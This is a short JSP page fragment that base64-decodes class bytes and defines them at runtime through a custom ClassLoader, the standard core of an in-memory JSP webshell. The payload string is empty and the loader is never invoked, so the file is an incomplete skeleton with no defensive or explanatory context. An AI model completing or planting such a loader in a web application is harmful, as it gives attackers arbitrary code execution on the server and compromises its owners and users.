<%@ page import="java.util.Base64" %>
<%@ page import="java.lang.reflect.Method" %>

<%

String base64Class = "";

byte[] classBytes = Base64.getDecoder().decode(base64Class);

ClassLoader loader = new ClassLoader() {
    public Class<?> define(byte[] bytes) {
        return defineClass(null, bytes, 0, bytes.length);
    }
};



%>